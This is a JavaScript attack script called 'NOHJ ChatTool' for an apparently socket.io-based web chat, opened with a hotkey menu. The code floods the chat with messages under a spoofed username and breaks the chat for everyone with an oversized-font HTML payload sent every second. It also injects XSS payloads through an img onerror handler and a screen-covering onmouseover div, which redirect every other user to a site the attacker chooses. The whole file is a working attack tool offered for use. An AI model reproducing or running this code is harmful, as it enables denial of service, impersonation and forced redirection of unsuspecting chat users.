socket2 = io()
alert("NOHJ ChatTool\n\ncoded by zastix")
alert("Press ' \\' to open the UI")
window.addEventListener("keydown", function(e) {
        if (e.key == `\\`) {
            switch(Number(prompt("What would you like to do\n\nSpam - 1\nSpoof Username - 2\nChat-Breaker - 3\nReidrect Everyone - 4\n\nMore soon!"))) {
                case 1:
                    window.userraw = prompt("What username would you like to use")
                    window.message = prompt("What would you like to say.\n\nPress '.' to change this")
                    //let amount = prompt("How many users would you like to spam on")
                    alert("Press ';' to stop spamming")
                    let stop = window.addEventListener("keydown", function(e) {
                        if (e.key == ';') {
                            alert("stoped")
                            clearInterval(spamint)
                        }
                    })
                    let cha = window.addEventListener("keydown", function(e) {
                        if (e.key == '.') {
                            window.message = prompt("Enter the new message")
                        }
                    })
                    let spamint = setInterval(() => {
                          if (socket2.disconnected) {
                                socket2.connect()
                          }
                          socket2.emit('chat message', {
                            message: window.message,
                            user: window.userraw
                          })
                    });
                    break;
                case 2:
                    name = prompt("What would you like your username to be?")
                    break;
                case 3:
                    //if (confirm("Would you like to stop any lag client-sided for you?") {
                    //            
                    //}
                    setInterval(() => {
                          socket2.emit('chat message', {
                            message: `<text style='font-size:500000rem;background-color:black;'></text>`,
                            user: ""
                          })
                          }, 1000)
                    break;
                case 4:
                    let site = prompt("What site would you like to redirect everybody to?\n\nExample: https://zastix.xyz/")
                    switch (Number(prompt("What method of XSS?\n\nIMG onError - 1\nDiv onhover - 2"))) {
                        case 1:
                            socket2.emit('chat message', {
                                message: `<img src="e.png" onerror="location.href='${site}'">`,
                                user: ''
                            })
                            break;
                        case 2:
                            socket2.emit('chat message', {
                                message: `<div style="transform:translate(-50%,-20%);width:10000px;height:10000px;background-color:black;position:absolute;" onmouseover=location.href="${site}">`,
                                user: ''
                            })
                            break;
                    }
            }
        }
    })
